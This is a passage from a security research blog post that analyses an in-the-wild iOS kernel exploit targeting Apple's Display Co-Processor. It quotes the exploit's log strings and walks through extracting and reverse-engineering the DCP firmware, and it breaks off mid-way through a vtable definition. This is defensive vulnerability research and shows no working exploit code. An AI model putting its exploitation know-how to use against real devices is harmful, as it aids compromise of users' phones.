 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Although all the exploits were different, five of them shared a common high-level structure. An initial phase where the kernel heap was manipulated to control object placement. Then the triggering of a kernel vulnerability followed by well-known steps to turn that into something useful, perhaps by disclosing kernel memory then building an arbitrary kernel memory write primitive.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The sixth exploit didn't have anything like that.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Perhaps it could be triggering a kernel logic bug like Linuz Henze's </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://github.com/LinusHenze/Fugu14">Fugu14</a></span><span>&nbsp;exploit, or a very bad memory safety issue which gave fairly direct kernel memory access. But neither of those seemed very plausible either. </span><span>It looked, quite simply, like an iOS kernel exploit from a decade ago, except one which was first quite carefully checking that it was only running on an iPhone 12 or 13.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">It contained log messages like:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; printf("Failed to prepare fake vtable: 0x%08x", ret);</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>which seemed to happen far earlier than the exploit could possibly have defeated mitigations like K</span><span>ASLR</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;and PAC.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Shortly after that was this log message:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; printf("Waiting for R/W primitives...");</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Why would you need to wait?</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Then shortly after that:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; printf("Memory read/write and callfunc primitives ready!");</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Up to that point the exploit made only four </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;calls and there were no other obvious attempts at heap manipulation. But there was another log message which started to shed some light:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">&nbsp; printf("Unexpected data read from DCP: 0x%08x", v49);</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.dlybqvef2fq5"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">DCP?</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">In October 2021 Adam Donenfeld tweeted this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><img /></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizH1ivW5VjBBB2oIDHbvRvevtn3SaYgaWlwf_F_bWSAb9b9kMrycHwATVj_tyHb22sjTc9jJmwQTc-ehvzmruznZtyWToUNiEfyif6nl3latUr3STT8P0YSL0MgxB8_t-CjNLdHITK0kpCcuYPJhFN7zuOX6s1DqOQVQxthrazNfK0ktsvn4Na1hl/s1988/Screenshot%202022-06-22%20at%2016.52.56.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="Screenshot of Tweet from @doadam on 11 Oct 2021, which is a retweet from @AmarSaar on 11 October 2021. The tweet from @AmarSaar reads 'So, another IOMFB vulnerability was exploited ITW (15.0.2). I bindiffed the patch and built a POC. And, because it's a great bug, I just finished writing a short blogpost with the tech details, to share this knowledge :) Check it out! https://saaramar.github.io/IOMFB_integer_overflow_poc/' and the retweet from @doadam reads 'This has been moved to the display coprocessor (DCP) starting from 15, at least on iPhone 12 (and most probably other ones as well)'." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizH1ivW5VjBBB2oIDHbvRvevtn3SaYgaWlwf_F_bWSAb9b9kMrycHwATVj_tyHb22sjTc9jJmwQTc-ehvzmruznZtyWToUNiEfyif6nl3latUr3STT8P0YSL0MgxB8_t-CjNLdHITK0kpCcuYPJhFN7zuOX6s1DqOQVQxthrazNfK0ktsvn4Na1hl/s1200/Screenshot%202022-06-22%20at%2016.52.56.png" style="max-height: 750; max-width: 600px;" title="Screenshot of Tweet from @doadam on 11 Oct 2021, which is a retweet from @AmarSaar on 11 October 2021. The tweet from @AmarSaar reads 'So, another IOMFB vulnerability was exploited ITW (15.0.2). I bindiffed the patch and built a POC. And, because it's a great bug, I just finished writing a short blogpost with the tech details, to share this knowledge :) Check it out! https://saaramar.github.io/IOMFB_integer_overflow_poc/' and the retweet from @doadam reads 'This has been moved to the display coprocessor (DCP) starting from 15, at least on iPhone 12 (and most probably other ones as well)'." /></a></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">DCP is the "Display Co-Processor" which ships with iPhone 12 and above and all M1 Macs.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>There's little public information about the DCP; the most comprehensive comes from the </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://asahilinux.org/">Asahi linux project</a></span><span>&nbsp;which is porting linux to M1 Macs. In their </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://asahilinux.org/2021/08/progress-report-august-2021/">August 2021</a></span><span>&nbsp;and </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://asahilinux.org/2021/10/progress-report-september-2021/">September 2021</a></span><span>&nbsp;updates they discussed their DCP reverse-engineering efforts and the open-source DCP client written by </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://twitter.com/alyssarzg">@alyssarzg</a></span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">. Asahi describe the DCP like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="c3 c8 c32"><span class="c5 c28 c25">On most mobile SoCs, the display controller is just a piece of hardware with simple registers. While this is true on the M1 as well, Apple decided to give it a twist. They added a coprocessor to the display engine (called DCP), which runs its own firmware (initialized by the system bootloader), and moved most of the display driver into the coprocessor. But instead of doing it at a natural driver boundary they took half of their macOS C++ driver, moved it into the DCP, and created a remote procedure call interface so that each half can call methods on C++ objects on the other CPU! </span></p>
 <p class="HovzfPYjjR-c8 HovzfPYjjR-c24"><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://asahilinux.org/2021/08/progress-report-august-2021/">https://asahilinux.org/2021/08/progress-report-august-2021/</a></span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The Asahi linux project reverse-engineered the API to talk to the DCP but they are restricted to using Apple's DCP firmware (loaded by iBoot) - they can't use a custom DCP firmware. Consequently their documentation is limited to the DCP RPC API with few details of the DCP internals.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.nj6hztnr911v"><span class="HovzfPYjjR-c2 HovzfPYjjR-c16">Setting the stage</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Before diving into DCP internals it's worth stepping back a little. What even is a co-processor in a modern, highly integrated SoC (System-on-a-Chip) and what might the consequences of compromising it be?</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Years ago a co-processor would likely have been a physically separate chip. Nowadays a large number of these co-processors are integrated along with their interconnects directly onto a single die, even if they remain fairly independent systems. We can see in this M1 die shot from </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1">Tech Insights</a></span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;that the CPU cores in the middle and right hand side take up only around 10% of the die:</span></p>
 <p class="HovzfPYjjR-c31 HovzfPYjjR-c8"></p>
 <p class="HovzfPYjjR-c8 HovzfPYjjR-c31"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjtJjSN0qdOa1cKBG72s9uuwcVKU5evSg9CiIPtpbbFox0fGgW7XZQU1Jj4IezjIdHC23sJbnklT6acyTFiqB-0-qmcj35Gq-ZZyTHP0DcfFkBztA0DL2P3lhYy2n0k8wgzmzaYX8IMeKosr4uuWMXT-wplsuJQmfR4LDgFzWAUZARvx5rfWjWiusz/s1116/Screenshot%202022-06-22%20at%2016.53.12.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="M1 die-shot from techinsights.com with possible location of DCP highlighted." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjtJjSN0qdOa1cKBG72s9uuwcVKU5evSg9CiIPtpbbFox0fGgW7XZQU1Jj4IezjIdHC23sJbnklT6acyTFiqB-0-qmcj35Gq-ZZyTHP0DcfFkBztA0DL2P3lhYy2n0k8wgzmzaYX8IMeKosr4uuWMXT-wplsuJQmfR4LDgFzWAUZARvx5rfWjWiusz/s1116/Screenshot%202022-06-22%20at%2016.53.12.png" style="max-height: 750; max-width: 600px;" title="M1 die-shot from techinsights.com with possible location of DCP highlighted." /></a></span></p>
 <p class="HovzfPYjjR-c24 HovzfPYjjR-c8"><span class="c5 c25 c28">M1 die-shot from techinsights.com with possible location of DCP added</span></p>
 <p class="HovzfPYjjR-c24 HovzfPYjjR-c8"><span class="HovzfPYjjR-c17 HovzfPYjjR-c25"><a class="HovzfPYjjR-c191" href="https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1">https://www.techinsights.com/blog/two-new-apple-socs-two-market-events-apple-a14-and-m1</a></span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Companies like </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://www.systemplus.fr/">SystemPlus</a></span><span>&nbsp;perform </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://www.systemplus.fr/wp-content/uploads/2020/12/SP20608-Apple-M1-System-on-Chip-Sample.pdf">very thorough analysis of these dies</a></span><span>. Based on their analysis the DCP is likely the rectangular region indicated on this M1 die. It takes up around the same amount of space as the four high-</span><span>efficiency</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;cores seen in the centre, though it seems to be mostly SRAM.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>With just this low-resolution image it's not really possible to say much more about the functionality or capabilities of the DCP and what level of system access it has. To answer those questions we'll need to take a look at the firmware.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.mnw2kq5jkaze"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">My kingdom for a .dSYM!</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The first step is to get the DCP firmware image. iPhones (and now M1 macs) use </span><span class="HovzfPYjjR-c7">.ipsw</span><span>&nbsp;files for system images. An </span><span class="HovzfPYjjR-c7">.ipsw</span><span>&nbsp;is really just a </span><span class="HovzfPYjjR-c7">.zip</span><span>&nbsp;archive and the </span><span class="HovzfPYjjR-c7">Firmware/</span><span>&nbsp;folder in the extracted </span><span class="HovzfPYjjR-c7">.zip</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;contains all the firmware for the co-processors, modems etc. The DCP firmware is this file:</span></p><hr style="display: none; page-break-before: always;" />
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; Firmware/dcp/iphone13dcp.im4p</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The </span><span class="HovzfPYjjR-c7">im4p</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;in this case is just a 25 byte header which we can discard:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; $ dd if=iphone13dcp.im4p of=iphone13dcp bs=25 skip=1</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c2 HovzfPYjjR-c6">&nbsp; $ file iphone13dcp</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; iphone13dcp: Mach-O 64-bit preload executable arm64</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>It's a Mach-O! Running </span><span class="HovzfPYjjR-c7">nm -a</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;to list all symbols shows that the binary has been fully stripped:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; $ nm -a iphone13dcp</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">&nbsp; iphone13dcp: no symbols</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Function names make understanding code significantly easier. From looking at the handful of strings in the exploit some of them looked like they might be referencing symbols in a DCP firmware image ("</span><span class="HovzfPYjjR-c7">M3_CA_ResponseLUT read: 0x%08x</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">" for example) so I thought perhaps there might be a DCP firmware image where the symbols hadn't been stripped.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Since the firmware images are distributed as </span><span class="HovzfPYjjR-c7">.zip</span><span>&nbsp;files and Apple's servers support range requests with a bit of python and the </span><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://github.com/marcograss/partialzip">partialzip</a></span><span>&nbsp;tool</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;we can relatively easily and quickly get every beta and release DCP firmware. I checked over 300 distinct images; every single one was stripped.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">Guess we'll have to do this the hard way!</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.m9onjpj2j9i"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Day 1; Instruction 1</span></h2>
 <p class="c3 c8 c12"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">$ otool -h raw_fw/iphone13dcp</span></p>
 <p class="c3 c8 c12 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p>
 <p class="c3 c8 c12"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">raw_fw/iphone13dcp:</span></p>
 <p class="c3 c8 c12"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">Mach header</span></p>
 <p class="c3 c8 c12"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">magic &nbsp; &nbsp; &nbsp;cputype &nbsp; cpusubtype caps filetype ncmds sizeofcmds flags</span></p>
 <p class="c3 c8 c12"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">0xfeedfacf 0x100000C 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x00 5 &nbsp; &nbsp; &nbsp; &nbsp;5 &nbsp; &nbsp; 2240 &nbsp; &nbsp; &nbsp; 0x00000001</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>That </span><span class="HovzfPYjjR-c7">cputype</span><span>&nbsp;is plain </span><span class="HovzfPYjjR-c7">arm64</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;(ArmV8) without pointer authentication support. The binary is fairly large (3.7MB) and IDA's autoanalysis detects over 7000 functions.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">With any brand new binary I usually start with a brief look through the function names and the strings. The binary is stripped so there are no function name symbols but there are plenty of C++ function names as strings:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><img /></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhY8rBSaTDR2W5pSgk9ssaCqN8M8Nuhd5_x6FkNSqOI-jRDFVab_jrrkZlN1DS2FKf9zeAPPDFkE30kNCPpN3PES9RdvBLj4L6G78zq134bTQcR1VEe7J30tYPoqqZ82z1cPwUcvF2wzfoOEbDf3l_4ucxpuOZFC2NLyrMYV_luJ_5dysxanajqsi-N/s1830/Screenshot%202022-06-22%20at%2016.53.26.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="A short list of C++ prototypes like IOMFB::UPBlock_ALSS::init(IOMFB::UPPipe *)." border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhY8rBSaTDR2W5pSgk9ssaCqN8M8Nuhd5_x6FkNSqOI-jRDFVab_jrrkZlN1DS2FKf9zeAPPDFkE30kNCPpN3PES9RdvBLj4L6G78zq134bTQcR1VEe7J30tYPoqqZ82z1cPwUcvF2wzfoOEbDf3l_4ucxpuOZFC2NLyrMYV_luJ_5dysxanajqsi-N/s1200/Screenshot%202022-06-22%20at%2016.53.26.png" style="max-height: 750; max-width: 600px;" title="A short list of C++ prototypes like IOMFB::UPBlock_ALSS::init(IOMFB::UPPipe *)." /></a></span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The cross-references to those strings look like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.c7f36f1411586a1b165d5a48e181a07b7b9d07a6"></a><a id="t.0"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">log</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c4">0x40000001LL</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"UPBlock_ALSS.cpp"</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c4">341</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"%s: capture buffer exhausted, aborting capture\n"</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">"void IOMFB::UPBlock_ALSS::send_data(uint64_t, uint32_t)"</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>This is almost certainly a logging macro which expands </span><span class="HovzfPYjjR-c7">__FILE__</span><span>,</span><span class="HovzfPYjjR-c7">&nbsp;__LINE__</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">__PRETTY_FUNCTION__</span><span>. This allows us to start renaming functions and finding vtable pointers.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.72tz1dtagcu2"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Object structure</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">From the Asahi linux blog posts we know that the DCP is using an Apple-proprietary RTOS called RTKit for which there is very little public information. There are some strings in the binary with the exact version:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">ADD &nbsp;X8, X8, #aLocalIphone13d@PAGEOFF ; "local-iphone13dcp.release"</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2">ADD &nbsp;X9, X9, #aRtkitIos182640@PAGEOFF ; "RTKit_iOS-1826.40.9.debug"</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The code appears to be predominantly C++. There appear to be multiple C++ object hierarchies; those involved with this vulnerability look a bit like IOKit C++ objects. Their common base class looks like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.23741390b29a0e8a199a26eb39699e3e43f7695e"></a><a id="t.1"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;__cppobj RTKIT_RC_RTTI_BASE</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; RTKIT_RC_RTTI_BASE_vtbl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">__vftable </span><span class="HovzfPYjjR-c30">/*VFT*/</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t refcnt</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint32_t </span><span class="HovzfPYjjR-c9">typeid</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">};</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">(These structure definitions are in the format IDA uses for C++-like objects)</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The </span><span class="HovzfPYjjR-c7">RTKit</span><span>&nbsp;base class has a vtable pointer, a reference count and a four-byte Run Time Type Information (RTTI) field - a 4-byte ASCII identifier like </span><span class="HovzfPYjjR-c7">BLHA</span><span>, </span><span class="HovzfPYjjR-c7">WOLO</span><span>, </span><span class="HovzfPYjjR-c7">MMAP</span><span>, </span><span class="HovzfPYjjR-c7">UNPI</span><span>, </span><span class="HovzfPYjjR-c7">OSST</span><span>, </span><span class="HovzfPYjjR-c7">OSBO</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;and so on. These identifiers look a bit cryptic but they're quite descriptive once you figure them out (and I'll describe the relevant ones as we encounter them.)</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The base type has the following associated vtable:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.e2f588f986d4c4d814dde7976c00d512e7353bbe"></a><a id="t.2"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c30">/*VFT*/</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;RTKIT_RC_RTTI_BASE_vtbl</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">take_ref</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">drop_ref</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
